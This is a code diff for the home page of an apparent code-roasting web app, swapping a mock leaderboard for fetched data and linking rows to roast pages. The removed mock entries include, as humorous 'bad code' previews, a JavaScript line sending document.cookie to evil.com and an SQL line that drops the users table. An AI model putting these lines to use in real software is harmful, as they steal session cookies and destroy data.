@@ -1,31 +1,11 @@
 import Link from "next/link"
+import { getLeaderboard, getLeaderboardStats } from "@/app/actions/get-leaderboard"
 import { CodeInputForm } from "@/components/ui/code-input-form"
 import { LeaderboardRow } from "@/components/ui/leaderboard-row"
 
-const MOCK_LEADERBOARD = [
-  {
-    rank: 1,
-    score: 1.2,
-    codePreview:
-      "eval(prompt('Enter code')); document.write(fetch('http://evil.com/?d='+document.cookie))",
-    language: "JavaScript",
-  },
-  {
-    rank: 2,
-    score: 1.8,
-    codePreview:
-      "if (x == TRUE) { return True; } else if (x == False) { return false; } else { return True; }",
-    language: "TypeScript",
-  },
-  {
-    rank: 3,
-    score: 2.4,
-    codePreview: "SELECT * FROM users WHERE 1=1; DROP TABLE users; -- TODO: add authentication",
-    language: "sql",
-  },
-]
+export default async function Home() {
+  const [rows, stats] = await Promise.all([getLeaderboard(3), getLeaderboardStats()])
 
-export default function Home() {
   return (
     <main className="pb-20">
       <div className="mx-auto flex max-w-[960px] flex-col items-center gap-32 px-5 pt-20">
@@ -48,11 +28,11 @@ export default function Home() {
           {/* footer hint */}
           <div className="flex items-center gap-6">
             <span className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
-              2,847 codes roasted
+              {stats.total.toLocaleString()} codes roasted
             </span>
             <span className="font-mono text-text-tertiary text-xs">·</span>
             <span className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
-              avg score: 4.2/10
+              avg score: {stats.avgScore.toFixed(1)}/10
             </span>
           </div>
         </section>
@@ -99,19 +79,21 @@ export default function Home() {
             </LeaderboardRow.Root>
 
             {/* rows */}
-            {MOCK_LEADERBOARD.map((row) => (
-              <LeaderboardRow.Root key={row.rank}>
-                <LeaderboardRow.Rank>{row.rank}</LeaderboardRow.Rank>
-                <LeaderboardRow.Score value={row.score} />
-                <LeaderboardRow.Code>{row.codePreview}</LeaderboardRow.Code>
-                <LeaderboardRow.Language>{row.language}</LeaderboardRow.Language>
-              </LeaderboardRow.Root>
+            {rows.map((row) => (
+              <Link key={row.id} href={`/roast/${row.id}`} className="block">
+                <LeaderboardRow.Root className="transition-colors hover:bg-bg-surface">
+                  <LeaderboardRow.Rank>{row.rank}</LeaderboardRow.Rank>
+                  <LeaderboardRow.Score value={row.score} />
+                  <LeaderboardRow.Code>{row.codePreview}</LeaderboardRow.Code>
+                  <LeaderboardRow.Language>{row.language ?? "—"}</LeaderboardRow.Language>
+                </LeaderboardRow.Root>
+              </Link>
             ))}
           </div>
 
           {/* fade hint */}
           <p className="text-center font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
-            showing top 3 of 2,847 · view full leaderboard &gt;&gt;
+            showing top 3 of {stats.total.toLocaleString()} · view full leaderboard &gt;&gt;
           </p>
         </section>
       </div>
